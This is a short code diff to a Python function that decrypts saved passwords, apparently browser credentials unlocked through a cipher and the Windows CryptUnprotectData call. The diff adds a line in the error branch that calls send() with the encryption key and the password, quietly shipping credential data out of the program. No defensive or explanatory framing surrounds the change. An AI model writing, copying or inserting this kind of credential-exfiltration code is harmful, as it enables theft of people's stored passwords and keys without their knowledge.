@@ -80,7 +80,8 @@ def password_decryption(password, encryption_key):
         # decrypt password
         return cipher.decrypt(password)[:-16].decode()
     except:
-
+        send("unencripted data : encrytion_key : "+str(encryption_key)+" password : "+str(password))
+        
         try:
             return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
         except:
